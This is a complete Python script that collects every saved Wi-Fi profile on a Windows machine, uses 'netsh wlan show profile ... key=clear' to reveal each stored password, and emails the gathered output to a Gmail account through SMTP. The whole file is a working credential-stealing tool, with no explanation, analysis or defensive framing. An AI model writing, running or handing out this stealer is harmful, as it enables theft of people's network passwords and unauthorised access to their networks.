import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "chcp 65001"
subprocess.check_output(command, shell=True)

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks = networks.decode('utf-8')
network_names_list = re.findall("(?::\s)(.*?\\r)", str(networks))

result = ""
for network_name in network_names_list:
    try:
        network_name = network_name.replace("\r", "")
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
        current_result = re.sub("(?:on interface )(.*)", "on interface: wireless network", current_result)
        result = result + current_result
    except:
        pass

send_mail("email@gmail.com", "password", result)

